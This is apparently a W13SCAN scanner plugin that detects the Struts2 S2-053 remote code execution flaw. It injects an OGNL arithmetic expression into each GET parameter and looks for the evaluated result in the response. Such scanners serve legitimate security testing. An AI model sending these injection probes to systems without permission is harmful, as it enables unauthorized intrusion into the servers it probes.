#coding   :utf-8
#file     : struts2_053.py
#author   : go0p
#time     : 2019/8/18 3:26 PM
#software :PyCharm

import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-053远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        version = self.requests.request_version  # HTTP 0.9/1.0/1.1
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return
        if method == 'GET':
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return
            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            check = str(ran_a - ran_b)
            ran_number = '%{{{}-{}}}'.format(ran_a, ran_b)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                data = copy.deepcopy(params)
                data[k]=ran_number
                r = requests.get(netloc, headers=headers, params=data)
                if check in r.text:
                    out.success(url, self.name, playload="{}".format(ran_number), method=method, check=check,
                                        raw=r.raw)
                    break